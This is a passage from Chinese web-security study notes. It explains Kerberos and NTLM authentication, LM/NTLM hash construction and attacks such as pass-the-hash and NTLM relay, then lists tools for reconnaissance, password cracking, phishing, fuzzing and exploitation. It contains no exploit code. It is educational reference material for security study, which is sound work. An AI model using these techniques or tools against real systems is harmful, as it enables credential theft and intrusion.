3. 客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据，得到Kc、s，然后生成一个Authenticator，其中主要包括当前时间和Ts,c的校验码，并且用SessionKey Kc,s加密。之后客户端将Authenticator和给server的票据同时发给服务器

4. 服务器首先用自己的密码解开票据，拿到SessionKey Kc,s，然后用Kc,s解开Authenticator，并做如下检查
   1. 检查Authenticator中的时间戳是不是在当前时间上下5分钟以内，并且检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行Replay攻击。
   2. 检查checksum是否正确
   3. 如果都正确，客户端就通过了认证

5. 服务器段可选择性地给客户端回复一条消息来完成双向认证，内容为用session key加密的时间戳

6. 客户端通过解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器

### 9.8.4. 完整的认证过程

上方介绍的流程已经能够完成客户端和服务器的相互认证。但是，比较不方便的是每次认证都需要客户端输入自己的密码。

因此在Kerberos系统中，引入了一个新的角色叫做：票据授权服务(TGS - Ticket Granting Service)，它的地位类似于一个普通的服务器，只是它提供的服务是为客户端发放用于和其他服务器认证的票据。

这样，Kerberos系统中就有四个角色：认证服务器(AS)，客户端(Client)，普通服务器(Server)和票据授权服务(TGS)。这样客户端初次和服务器通信的认证流程分成了以下6个步骤：

1. 客户端向AS发起请求，请求内容是：客户端的principal，票据授权服务器的rincipal

2. AS收到请求之后，随机生成一个密码Kc, s(session key), 并生成以下两个票据返回给客户端：
   1. 给客户端的票据，用客户端的密码加密，内容为随机密码，session，tgs_principal
   2. 给tgs的票据，用tgs的密码加密，内容为随机密码，session，client_principal

3. 客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据，得到Kc、s，然后生成一个Authenticator，其中主要包括当前时间和Ts,c的校验码，并且用SessionKey Kc,s加密。之后客户端向tgs发起请求，内容包括:
   1. Authenticator
   2. 给tgs的票据同时发给服务器
   3. server_principal

4. TGS首先用自己的密码解开票据，拿到SessionKey Kc,s，然后用Kc,s解开Authenticator，并做如下检查
   1. 检查Authenticator中的时间戳是不是在当前时间上下5分钟以内，并且检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行Replay攻击。
   2. 检查checksum是否正确
   3. 如果都正确，客户端就通过了认证

5. tgs生成一个session key组装两个票据给客户端
   1. 用客户端和tgs的session key加密的票据，包含新生成的session key和server_principal
   2. 用服务器的密码加密的票据，包括新生成的session key和client principal

6. 客户端收到两个票据后，解开自己的，然后生成一个Authenticator，发请求给服务器，内容包括
   1. Authenticator
   2. 给服务器的票据

7. 服务器收到请求后，用自己的密码解开票据，得到session key，然后用session key解开authenticator对可无端进行验证

8. 服务器可以选择返回一个用session key加密的之前的是时间戳来完成双向验证

9. 客户端通过解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器

### 9.8.5. 优缺点

#### 9.8.5.1. 优点

- 密码不易被窃听
- 密码不在网上传输
- 密码猜测更困难
- 票据被盗之后难以使用，因为需要配合认证头来使用

#### 9.8.5.2. 缺点

- 缺乏撤销机制
- 引入了复杂的密钥管理
- 需要时钟同步
- 伸缩性受限

### 9.8.6. 参考链接

#### 9.8.6.1. 规范

- RFC 1510 The Kerberos Network Authentication Service
- Kerberos认证流程详解

#### 9.8.6.2. 攻击

- Delegate to the Top: Abusing Kerberos for arbitrary impersonations and RCE
- Kerberos Protocol Extensions: Service for User and Constrained Delegation Protocol
- Kerberos Technical Supplement for Windows
- Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain

---

## [NTLM 身份验证](https://websec.readthedocs.io/zh/latest/auth/ntlm.html)

### 9.9.1. NTLM认证

NTLM是NT LAN Manager的缩写，NTLM是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议。

#### 9.9.1.1. 基本流程

* 客户端在本地加密当前用户的密码成为密码散列
* 客户端向服务器明文发送账号
* 服务器端产生一个16位的随机数字发送给客户端，作为一个challenge
* 客户端用加密后的密码散列来加密challenge，然后返回给服务器，作为response
* 服务器端将用户名、challenge、response发送给域控制器
* 域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密chellenge
* 域控制器比较两次加密的challenge，如果一样那么认证成功，反之认证失败

#### 9.9.1.2. Net-NTLMv1

Net-NTLMv1协议的基本流程如下：

* 客户端向服务器发送一个请求
* 服务器接收到请求后，生成一个8位的Challenge，发送回客户端
* 客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器
* 服务器校验response

Net-NTLMv1 response的计算方法为

* 将用户的NTLM hash补零至21字节分成三组7字节数据
* 三组数据作为3DES加密算法的三组密钥，加密Server发来的Challenge

这种方式相对脆弱，可以基于抓包工具和彩虹表爆破工具进行破解。

#### 9.9.1.3. Net-NTLMv2

自Windows Vista起，微软默认使用Net-NTLMv2协议，其基本流程如下：

* 客户端向服务器发送一个请求
* 服务器接收到请求后，生成一个16位的Challenge，发送回客户端
* 客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器
* 服务器校验response

### 9.9.2. Hash

#### 9.9.2.1. LM Hash

LM Hash(LAN Manager Hash) 是windows最早用的加密算法，由IBM设计。LM Hash 使用硬编码秘钥的DES，且存在缺陷。早期的Windows系统如XP、Server 2003等使用LM Hash，而后的系统默认禁用了LM Hash并使用NTLM Hash。

LM Hash的计算方式为：

* 转换用户的密码为大写，14字节截断
* 不足14字节则需要在其后添加0×00补足
* 将14字节分为两段7字节的密码
* 以 `KGS!@#$%` 作为秘钥对这两组数据进行DES加密，得到16字节的哈希
* 拼接后得到最后的LM Hash。

作为早期的算法，LM Hash存在着诸多问题：

* 密码长度不会超过14字符，且不区分大小写
* 如果密码长度小于7位，后一组哈希的值确定，可以通过结尾为 `aad3b435b51404ee` 来判断密码长度不超过7位
* 分组加密极大程度降低了密码的复杂度
* DES算法强度低

#### 9.9.2.2. NTLM Hash

为了解决LM Hash的安全问题，微软于1993年在Windows NT 3.1中引入了NTLM协议。

Windows 2000 / XP / 2003 在密码超过14位前使用LM Hash，在密码超过14位后使用NTLM Hash。而之后从Vista开始的版本都使用NTLM Hash。

NTLM Hash的计算方法为：

* 将密码转换为16进制，进行Unicode编码
* 基于MD4计算哈希值

### 9.9.3. 攻击

#### 9.9.3.1. Pass The Hash

Pass The Hash (PtH) 是攻击者捕获帐号登录凭证后，复用凭证Hash进行攻击的方式。

微软在2012年12月发布了针对Pass The Hash攻击的防御指导，文章中提到了一些防御方法，并说明了为什么不针对 Pass The Hash提供更新补丁。

#### 9.9.3.2. Pass The Key

在禁用NTLM的环境下，可以用mimikatz等工具直接获取密码。

#### 9.9.3.3. NTLM Relay

攻击者可以一定程度控制客户端网络的时候，可以使用中间人攻击的方式来获取权限。对客户端伪装为身份验证服务器，对服务端伪装为需要认证的客户端。

### 9.9.4. 参考链接

* [Windows身份认证及利用思路](https://www.freebuf.com/articles/system/224171.html)
* [The NTLM Authentication Protocol and Security Support Provider](http://davenport.sourceforge.net/ntlm.html)

---

## [权限系统设计模型](https://websec.readthedocs.io/zh/latest/auth/model.html)

常见的权限设计模式有以下几种：

- 自主访问控制 (Discretionary Access Control, DAC)
- 强制访问控制 (Mandatory Access Control, MAC)
- 基于角色的访问控制 (Role-Based Access Control, RBAC)
- 基于属性的权限验证 (Attribute-Based Access Control, ABAC)

常用的概念有：

- **用户**: 发起操作的主体
- **对象**: 发起操作的客体，即操作的对象
- **权限**: 用来指代对某对象的一种/一类操作
- **权限控制表 (Access Control List, ACL)**: 描述用户与权限之间关系的数据表
- **权限控制矩阵 (Access Control Matrix)**: 一套抽象、形式化的安全性模型。这套模型描述了电脑系统中的安全保护状态，各别表示其下的每个附属子体，对于系统中的每个对象，其所拥有的权限。

**DAC** 根据 ACL 的信息来决定用户是否能对某个对象进行操作。而拥有某个对象权限的用户，又可以将该对象的权限分配给其他用户，所以这种模型被称为自主（Discretionary）访问控制。

由于 DAC 权限控制较为分散，每个用户和对象都有一些权限标识，所以引入了 **MAC** 。每个用户和对象都有权限标识，用户是否能操作取决于双方的权限标识关系。这种方式不能灵活的授权，适合权限控制较为严格的场景。

**RBAC** 则是迄今为止最为普及的权限设计模型，它引入了角色 (Role) 的概念。 每个用户可以关联一个或多个角色，每个角色也可以关联一个或多个权限。 当需要新的权限配置时，可以根据需求灵活创建角色。

不同于 RBAC 按角色进行关联， **ABAC** 根据属性进行关联。通常来说，属性分为几类：用户属性、环境属性（例如时间）、操作属性（当前操作）、对象属性。ABAC 则通过动态计算一个或一组属性来是否满足对应条件来进行授权判断。

---

# Web安全学习笔记 - 工具与资源 + 手册速查 + 其他

## [Web 安全学习资源汇总](https://websec.readthedocs.io/zh/latest/tools/resource.html)

本页面来自 Web 安全知识库，提供了网络安全学习的完整书单、网站、博客、漏洞赏金平台及实验环境资源。

### 10.1. 推荐资源

#### 书单

##### 前端
- Web之困
- 白帽子讲Web安全
- 白帽子讲浏览器安全（钱文祥）
- Web前端黑客技术揭秘
- XSS跨站脚本攻击剖析与防御
- SQL注入攻击与防御

##### 网络
- Understanding linux network internals
- TCP/IP Architecture, Design, and Implementation in Linux
- Linux Kernel Networking: Implementation and Theory
- Bulletproof SSL and TLS
- UNIX Network Programming
- TCP / IP 协议详解

##### SEO
- SEO艺术

##### 无线攻防
- 无线网络安全攻防实战
- 无线网络安全攻防实战进阶
- 黑客大揭秘——近源渗透测试（柴坤哲等）

##### Hacking Programming
- Gray Hat Python

##### 社会工程学
- 社会工程：安全体系中的人性漏洞
- 反欺骗的艺术
- 反入侵的艺术

##### 数据安全
- 大数据治理与安全 从理论到开源实践（刘驰等）
- 企业大数据处理 Spark、Druid、Flume与Kafka应用实践（肖冠宇）
- 数据安全 架构设计与实战（郑云文）

##### 机器学习与网络安全
- Web安全深度学习实战（刘焱）
- Web安全机器学习入门（刘焱）
- Web安全之强化学习与GAN（刘焱）
- AI安全之对抗样本入门（兜哥）

##### 安全建设
- 企业安全建设入门——基于开源软件打造企业网络安全（刘焱）
- 企业安全建设指南——金融行业安全架构与技术实践（聂君等）
- 大型互联网企业安全架构（石祖文）
- CISSP官方学习指南
- CISSP认证考试指南
- Linux系统安全 纵深防御、安全扫描与入侵检测（胥峰）

##### 综合
- Web安全深度剖析
- 黑客秘笈——渗透测试实用指南
- 黑客攻防技术宝典——web实战篇

##### 法律
- 信息安全标准和法律法规（第二版）（武汉大学出版社）

#### 网站
- https://adsecurity.org/

#### 博客
- https://www.leavesongs.com/
- https://paper.seebug.org/
- https://xz.aliyun.com/
- https://portswigger.net/blog
- https://www.hackerone.com/blog

#### Bug Bounty 平台
- https://www.hackerone.com/
- https://bugcrowd.com
- https://www.synack.com/
- https://cobalt.io/

#### 实验环境

##### Web安全相关CTF题目
- https://github.com/orangetw/My-CTF-Web-Challenges
- https://www.ripstech.com/php-security-calendar-2017/
- https://github.com/wonderkun/CTF_web
- https://github.com/CHYbeta/Code-Audit-Challenges
- https://github.com/l4wio/CTF-challenges-by-me
- https://github.com/tsug0d/MyAwesomeWebChallenge
- https://github.com/a0xnirudh/kurukshetra
- http://www.xssed.com/

##### 域实验环境
- **Adaz**: Active Directory Hunting Lab in Azure
- **Detection Lab**: Vagrant & Packer scripts to build a lab environment complete with security tooling and logging best practices

#### 知识库

##### Awesome 系列
- Awesome CobaltStrike
- Awesome Cybersecurity Blue Team
- Awesome Hacking
- awesome sec talks
- Awesome Security
- awesome web security
- Awesome-Android-Security

##### Bug Hunting
- **HowToHunt**: Tutorials and Things to Do while Hunting Vulnerability

##### Java
- **learnjavabug**: Java安全相关的漏洞和技术demo

##### 红蓝对抗
- **atomic red team**: Small and highly portable detection tests based on MITRE's ATT&CK

##### 后渗透
- **Powershell攻击指南 黑客后渗透之道**
- **Active Directory Exploitation Cheat Sheet**

### 资源分类速查

| 分类 | 数量 | 代表资源 |
|------|------|----------|
| 前端安全书籍 | 6本 | 白帽子讲Web安全 |
| 网络安全书籍 | 6本 | TCP/IP协议详解 |
| 机器学习+安全 | 4本 | Web安全深度学习实战 |
| 安全建设 | 6本 | 企业安全建设指南 |
| Bug Bounty平台 | 4个 | HackerOne, BugCrowd |
| CTF题目资源 | 8个 | orangetw/CTF challenges |
| Awesome知识库 | 7个 | awesome-web-security |

---

## [相关论文](https://websec.readthedocs.io/zh/latest/tools/papers.html)

### 10.2. 相关论文

#### 10.2.1. 论文列表
- [PRE-list](https://github.com/techge/PRE-list) List of (automatic) protocol reverse engineering tools for network protocols

#### 10.2.2. 流量分析
- Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware[C]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278.
- Nasr M, Houmansadr A, Mazumdar A. Compressive traffic analysis: A new paradigm for scalable traffic analysis[C]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 2053-2069.

#### 10.2.3. 漏洞自动化
- Staicu C A, Pradel M, Livshits B. SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE. JS[C]//NDSS. 2018.
- Atlidakis V , Godefroid P , Polishchuk M . REST-ler: Automatic Intelligent REST API Fuzzing[J]. 2018.
- Alhuzali A, Gjomemo R, Eshete B, et al. {NAVEX}: Precise and Scalable Exploit Generation for Dynamic Web Applications[C]//27th {USENIX} Security Symposium ({USENIX} Security 18). 2018: 377-392.

#### 10.2.4. 攻击技巧
- Lekies S, Kotowicz K, Groß S, et al. Code-reuse attacks for the web: Breaking cross-site scripting mitigations via script gadgets[C]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 1709-1723.
- Papadopoulos P, Ilia P, Polychronakis M, et al. Master of Web Puppets: Abusing Web Browsers for Persistent and Stealthy Computation[J]. arXiv preprint arXiv:1810.00464, 2018.

#### 10.2.5. 攻击检测
- Liu T, Qi Y, Shi L, et al. Locate-then-detect: real-time web attack detection via attention-based deep neural networks[C]//Proceedings of the 28th International Joint Conference on Artificial Intelligence. AAAI Press, 2019: 4725-4731.

#### 10.2.6. 隐私
- Klein A, Pinkas B. DNS Cache-Based User Tracking[C]//NDSS. 2019.

#### 10.2.7. 指纹
- Hayes J, Danezis G. k-fingerprinting: A robust scalable website fingerprinting technique[C]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 1187-1203.
- Overdorf R, Juarez M, Acar G, et al. How unique is your. onion?: An analysis of the fingerprintability of tor onion services[C]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 2021-2036.

#### 10.2.8. 侧信道
- Rosner N, Kadron I B, Bang L, et al. Profit: Detecting and Quantifying Side Channels in Networked Applications[C]//NDSS. 2019.

#### 10.2.9. 认证
- Ghasemisharif M, Ramesh A, Checkoway S, et al. O single sign-off, where art thou? an empirical analysis of single sign-on account hijacking and session management on the web[C]//27th {USENIX} Security Symposium ({USENIX} Security 18). 2018: 1475-1492.

#### 10.2.10. 防护
- Pellegrino G, Johns M, Koch S, et al. Deemon: Detecting CSRF with dynamic analysis and property graphs[C]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 1757-1771.

---

## [信息收集](https://websec.readthedocs.io/zh/latest/tools/info.html)

### 10.3. 信息收集

#### 10.3.1. Whois
- [who.is](https://who.is/)
- [万网WHOIS](https://whois.aliyun.com/)
- [腾讯云WHOIS](https://whois.cloud.tencent.com/)
- [站长之家WHOIS](https://whois.chinaz.com/)

#### 10.3.2. 网站备案
- [天眼查](https://www.tianyancha.com/)
- [ICP备案查询](http://www.beianbeian.com/)
- [爱站备案查询](https://icp.aizhan.com)

#### 10.3.3. CDN查询
- [多地Ping](https://ping.chinaz.com/)
- [CDN服务商查询](https://tools.ipip.net/cdn.php)

#### 10.3.4. 子域爆破
- [Amass](https://github.com/OWASP/Amass) In-depth Attack Surface Mapping and Asset Discovery
- [subDomainsBrute](https://github.com/lijiejie/subDomainsBrute)
- [wydomain](https://github.com/ring04h/wydomain)
- [broDomain](https://github.com/code-scan/BroDomain)
- [ESD](https://github.com/FeeiCN/ESD)
- [aiodnsbrute](https://github.com/blark/aiodnsbrute)
- [OneForAll](https://github.com/shmilylty/OneForAll)
- [subfinder](https://github.com/subfinder/subfinder)
- [altdns](https://github.com/infosec-au/altdns) Generates permutations, alterations and mutations of subdomains and then resolves them

#### 10.3.5. 域名获取
- [the art of subdomain enumeration](https://github.com/appsecco/the-art-of-subdomain-enumeration)
- [sslScrape](https://github.com/cheetz/sslScrape/blob/master/sslScrape.py)
- [aquatone](https://github.com/michenriksen/aquatone) A Tool for Domain Flyovers
- [teemo](https://github.com/bit4woo/teemo) A Domain Name & Email Address Collection Tool
- [DNS DB 历史记录](https://dnsdb.io/zh-cn/)

#### 10.3.6. 弱密码爆破
- [hydra](https://github.com/vanhauser-thc/thc-hydra)
- [medusa](https://github.com/jmk-foofus/medusa) is a high-speed network authentication cracking tool
- [Ncrack](https://github.com/nmap/ncrack)
- [htpwdScan](https://github.com/lijiejie/htpwdScan)
- [patator](https://github.com/lanjelot/patator)

#### 10.3.7. Git信息泄漏
- [GitHack By lijiejie](https://github.com/lijiejie/GitHack)
- [GitHack By BugScan](https://github.com/BugScanTeam/GitHack)
- [GitTools](https://github.com/internetwache/GitTools)
- [Zen](https://github.com/s0md3v/Zen)
- [dig github history](https://github.com/dxa4481/truffleHog)
- [gitrob Reconnaissance tool for GitHub organizations](https://github.com/michenriksen/gitrob)
- [git secrets](https://github.com/awslabs/git-secrets)
- [shhgit](https://github.com/eth0izzle/shhgit) Find GitHub secrets in real time
- [GitHound](https://github.com/tillson/git-hound) GitHound pinpoints exposed API keys on GitHub
- [x patrol](https://github.com/MiSecurity/x-patrol) Github leaked patrol
- [GitDorker](https://github.com/obheda12/GitDorker) scrape secrets from GitHub

#### 10.3.8. Github监控
- [Github Monitor](https://github.com/VKSRC/Github-Monitor) Github Sensitive Information Leakage Monitor
- [Github Dorks](https://github.com/techgaun/github-dorks)
- [GSIL](https://github.com/FeeiCN/GSIL)
- [Hawkeye](https://github.com/0xbug/Hawkeye)
- [gshark](https://github.com/neal1991/gshark)
- [GitGot](https://github.com/BishopFox/GitGot)
- [gitGraber](https://github.com/hisxo/gitGraber) monitor GitHub to search and find sensitive data

#### 10.3.9. 路径及文件扫描
- [weakfilescan](https://github.com/ring04h/weakfilescan)
- [DirBrute](https://github.com/Xyntax/DirBrute)
- [dirsearch](https://github.com/maurosoria/dirsearch)
- [bfac](https://github.com/mazen160/bfac)
- [ds_store_exp](https://github.com/lijiejie/ds%5Fstore%5Fexp)

#### 10.3.10. 路径爬虫
- [crawlergo](https://github.com/0Kee-Team/crawlergo) A powerful dynamic crawler for web vulnerability scanners

#### 10.3.11. 指纹识别
- [Wappalyzer](https://github.com/AliasIO/Wappalyzer)
- [whatweb](https://github.com/urbanadventurer/whatweb)
- [Wordpress Finger Print](https://github.com/iniqua/plecost)
- [CMS指纹识别](https://github.com/n4xh4ck5/CMSsc4n)
- [JA3](https://github.com/salesforce/ja3) is a standard for creating SSL client fingerprints
- [TideFinger](https://github.com/TideSec/TideFinger)
- [JARM](https://github.com/salesforce/jarm) active Transport Layer Security (TLS) server fingerprinting tool
- [fingerprintjs](https://github.com/fingerprintjs/fingerprintjs) Browser fingerprinting library

#### 10.3.12. Waf指纹
- [identywaf](https://github.com/enablesecurity/identywaf)
- [wafw00f](https://github.com/enablesecurity/wafw00f)
- [WhatWaf](https://github.com/Ekultek/WhatWaf)

#### 10.3.13. 端口扫描
- [nmap](https://github.com/nmap/nmap)
- [zmap](https://github.com/zmap/zmap)
- [masscan](https://github.com/robertdavidgraham/masscan)
- [ShodanHat](https://github.com/HatBashBR/ShodanHat)
- [lzr](https://github.com/stanford-esrg/lzr) LZR quickly detects and fingerprints unexpected services
- [ZGrab2](https://github.com/zmap/zgrab2) Fast Go Application Scanner
- [RustScan](https://github.com/RustScan/RustScan) The Modern Port Scanner
- DNS `dnsenum nslookup dig fierce`
- SNMP `snmpwalk`

#### 10.3.14. DNS数据查询
- [VirusTotal](https://www.virustotal.com/)
- [PassiveTotal](https://passivetotal.org)
- [DNSDB](https://www.dnsdb.info/)
- [sitedossier](http://www.sitedossier.com/)

#### 10.3.15. DNS关联
- [Cloudflare Enumeration Tool](https://github.com/mandatoryprogrammer/cloudflare%5Fenum)
- [Certificate Search](https://crt.sh/)

#### 10.3.16. 云服务
- [Find aws s3 buckets](https://github.com/gwen001/s3-buckets-finder)
- [CloudScraper](https://github.com/jordanpotti/CloudScraper)
- [AWS Bucket Dump](https://github.com/jordanpotti/AWSBucketDump)

#### 10.3.17. 数据查询
- [Censys](https://censys.io)
- [Shodan](https://www.shodan.io/)
- [Zoomeye](https://www.zoomeye.org/)
- [fofa](https://fofa.so/)
- [scans](https://scans.io/)
- [Just Metadata](https://github.com/FortyNorthSecurity/Just-Metadata)
- [publicwww](https://publicwww.com/)

#### 10.3.18. Password
- [Probable Wordlists](https://github.com/berzerk0/Probable-Wordlists) Wordlists sorted by probability
- [Common User Passwords Profiler](https://github.com/Mebus/cupp)
- [chrome password grabber](https://github.com/x899/chrome%5Fpassword%5Fgrabber)
- [DefaultCreds cheat sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) One place for all the default credentials
- [SuperWordlist](https://github.com/fuzz-security/SuperWordlist)

#### 10.3.19. CI信息泄露
- [secretz](https://github.com/lc/secretz) minimizing the large attack surface of Travis CI

#### 10.3.20. 个人数据画像
- [GHunt](https://github.com/mxrch/GHunt) Investigate Google Accounts with emails

#### 10.3.21. 邮箱收集
- [EmailHarvester](https://github.com/maldevel/EmailHarvester)

#### 10.3.22. 其他
- [datasploit](https://github.com/DataSploit/datasploit)
- [watchdog](https://github.com/flipkart-incubator/watchdog)
- [archive](https://archive.org/web/)
- [HTTPLeaks](https://github.com/cure53/HTTPLeaks)
- [htrace](https://github.com/trimstray/htrace.sh)
- [Quake Command-Line Application](https://github.com/360quake/quake%5Frs) 360网络空间测绘系统

---

## [社会工程学](https://websec.readthedocs.io/zh/latest/tools/socialengineering.html)

### 10.4. 社会工程学

#### 10.4.1. OSINT 开源情报收集

| 工具名称 | 描述/链接 |
|---------|----------|
| osint | [osintframework.com](http://osintframework.com/) |
| osint git | [OSINT-Framework](https://github.com/lockfale/OSINT-Framework) |
| OSINT-Collection | [OSINTCollection](https://github.com/Ph055a/OSINTCollection) |
| trape | [trape](https://github.com/jofpin/trape) |
| Photon | [Photon](https://github.com/s0md3v/Photon) |
| pockint | [pockint](https://github.com/netevert/pockint) |

#### 10.4.2. 社交工具

| 工具名称 | 描述 |
|---------|------|
| **SlackPirate** | Slack Enumeration and Extraction Tool - 从Slack工作区提取敏感信息 |
| **twint** | 高级Twitter爬虫与OSINT工具 |

#### 10.4.3. 个人搜索

| 工具名称 | 描述 |
|---------|------|
| **pipl** | 人物搜索引擎 - [pipl.com](https://pipl.com/) |
| **hunter** | 邮箱查找工具 - [hunter.io](https://hunter.io) |
| **EagleEye** | 图像追踪工具 |
| **LinkedInt** | LinkedIn渗透测试工具 |
| **sherlock** | 用户名搜索工具 |
| **email enum** | 邮箱枚举工具 |
| **Sreg** | 社工信息收集工具 |
| **usersearch** | 用户搜索聚合 - [usersearch.org](https://usersearch.org/) |
| **User Searcher** | 在2000+网站搜索用户名 |

#### 10.4.4. Hacking Database 黑客数据库

| 工具/资源 | 链接 |
|----------|------|
| **GHDB** (Google Hacking Database) | [exploit-db.com](https://www.exploit-db.com/google-hacking-database/) |
| **have i been pwned** | 数据泄露查询 |

#### 10.4.5. 钓鱼工具

| 工具名称 | 描述 |
|---------|------|
| **spoofcheck** | SPF/DKIM/DMARC检测 |
| **gophish** | 开源钓鱼框架 |
| **SocialFish** | 钓鱼页面生成器 |
| **HFish** | 便捷蜜罐平台 |
| **blackeye** | 完整钓鱼工具，含32个模板 |
| **king phisher** | 钓鱼活动工具包 |
| **espoofer** | 邮件欺骗测试工具（绕过SPF/DKIM/DMARC） |
| **ditto** | IDN同形异义攻击工具 |
| **SiteCopy** | 网站备份与网络数据收集工具 |
| **goblin** | 红蓝对抗仿真钓鱼系统 |

#### 10.4.6. Squatting 域名仿冒
- [dnstwist](https://github.com/elceef/dnstwist) 域名排列引擎，用于检测同形钓鱼、拼写错误仿冒，品牌冒充

#### 10.4.7. 网盘搜索
- [虫部落](http://magnet.chongbuluo.com/)
- [盘多多](http://www.panduoduo.net/)
- [Infinite Panc](https://www.panc.cc)

#### 10.4.8. 密码猜测
- [OMEN](https://github.com/RUB-SysSec/OMEN) Ordered Markov ENumerator - 密码猜测器
- [genpAss](https://github.com/RicterZ/genpAss) 密码生成/猜测工具

#### 10.4.9. 伪造
- [email_hack](https://github.com/Macr0phag3/email%5Fhack) 基于Python伪造电子邮件发件人

#### 10.4.10. 综合框架
- [theHarvester](https://github.com/laramies/theHarvester) 综合OSINT收集框架
- [Th3inspector](https://github.com/Moham3dRiahi/Th3inspector) 综合侦察工具
- [ReconDog](https://github.com/s0md3v/ReconDog) 侦察与信息收集工具

---

## [模糊测试](https://websec.readthedocs.io/zh/latest/tools/fuzz.html)

### 10.5. 模糊测试

#### 10.5.1. Web Fuzz
- [wfuzz](https://github.com/xmendez/wfuzz)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [fuzzdb](https://github.com/fuzzdb-project/fuzzdb)
- [foospidy payloads](https://github.com/foospidy/payloads)
- [ffuf](https://github.com/ffuf/ffuf) Fast web fuzzer written in Go

#### 10.5.2. 扫描器
- [Nuclei](https://github.com/projectdiscovery/nuclei) a fast tool for configurable targeted vulnerability scanning
- [xray](https://github.com/chaitin/xray) 安全评估工具，支持常见 web 安全问题扫描和自定义 poc

#### 10.5.3. XSS Payloads
- [PORTSWIGGER XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Pgaijin66 XSS-Payloads](https://github.com/Pgaijin66/XSS-Payloads)
- [OWASP XSS](https://www.owasp.org/index.php/XSS%5FFilter%5FEevasion%5FCheat%5FSheet)

#### 10.5.4. Burp插件
- [BurpBounty](https://github.com/wagiro/BurpBounty) Scan Check Builder
- [BurpShiroPassiveScan](https://github.com/pmiaowu/BurpShiroPassiveScan)
- [IntruderPayloads](https://github.com/1N3/IntruderPayloads) A collection of Burpsuite Intruder payloads

#### 10.5.5. 字典
- [Blasting dictionary](https://github.com/rootphantomer/Blasting%5Fdictionary)
- [pydictor](https://github.com/LandGrey/pydictor) A powerful and useful hacker dictionary builder
- [fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts) Web Pentesting Fuzz 字典
- [bruteforce lists](https://github.com/random-robbie/bruteforce-lists)
- [CT subdomains](https://github.com/internetwache/CT%5Fsubdomains)
- [PentesterSpecialDict](https://github.com/ppbibo/PentesterSpecialDict) 渗透测试人员专用精简化字典

#### 10.5.6. Unicode Fuzz
- [utf16encode](http://www.fileformat.info/info/charset/UTF-16/list.htm)

#### 10.5.7. WAF Bypass
- [abuse ssl bypass waf](https://github.com/LandGrey/abuse-ssl-bypass-waf)
- [wafninja](https://github.com/khalilbijjou/wafninja)

---

## [漏洞利用/检测](https://websec.readthedocs.io/zh/latest/tools/exploit.html)

### 10.6. 漏洞利用/检测

#### 10.6.1. 数据库注入
- [SQLMap](https://github.com/sqlmapproject/sqlmap)
- [bbqsql](https://github.com/Neohapsis/bbqsql)
- [MSDAT](https://github.com/quentinhardy/msdat) Microsoft SQL Database Attacking Tool

#### 10.6.2. 非结构化数据库注入
- [NoSQLAttack](https://github.com/youngyangyang04/NoSQLAttack)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [Nosql Exploitation Framework](https://github.com/torque59/Nosql-Exploitation-Framework)
- [MongoDB audit](https://github.com/stampery/mongoaudit)

#### 10.6.3. 数据库漏洞利用
- [mysql unsha1](https://github.com/cyrus-and/mysql-unsha1)
- [ODAT](https://github.com/quentinhardy/odat) Oracle Database Attacking Tool

#### 10.6.4. XSS
- [BeEF](https://github.com/beefproject/beef)
- [XSS Reciver](https://github.com/firesunCN/BlueLotus%5FXSSReceiver)
- [DSXS](https://github.com/stamparm/DSXS)
- [XSStrike](https://github.com/s0md3v/XSStrike)
- [xsssniper](https://github.com/gbrindisi/xsssniper)
- [tracy](https://github.com/nccgroup/tracy)
- [xsleaks](https://github.com/xsleaks/xsleaks) A collection of browser-based side channel attack vectors

#### 10.6.5. SSRF
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [SSRF Proxy](https://github.com/bcoles/ssrf%5Fproxy)
- [Gopherus](https://github.com/tarunkant/Gopherus)
- [SSRF Testing](https://github.com/cujanovic/SSRF-Testing)

#### 10.6.6. 模版注入
- [tplmap](https://github.com/epinna/tplmap)

#### 10.6.7. HTTP Request Smuggling
- [smuggler](https://github.com/defparam/smuggler) An HTTP Request Smuggling / Desync testing tool
- [h2cSmuggler](https://github.com/BishopFox/h2csmuggler) HTTP Request Smuggling over HTTP/2 Cleartext (h2c)

#### 10.6.8. 命令注入
- [commix](https://github.com/commixproject/commix)

#### 10.6.9. PHP
- [Chankro](https://github.com/TarlogicSecurity/Chankro) Herramienta para evadir disable_functions y open_basedir

#### 10.6.10. LFI
- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [FDsploit](https://github.com/chrispetrou/FDsploit)

#### 10.6.11. struts
- [struts scan](https://github.com/Lucifer1993/struts-scan)

#### 10.6.12. CMS
- [Joomla Vulnerability Scanner](https://github.com/rezasp/joomscan)
- [Drupal enumeration & exploitation tool](https://github.com/immunIT/drupwn)
- [Wordpress Vulnerability Scanner](https://github.com/UltimateLabs/Zoom)
- [TPscan](https://github.com/Lucifer1993/TPscan) 一键ThinkPHP漏洞检测
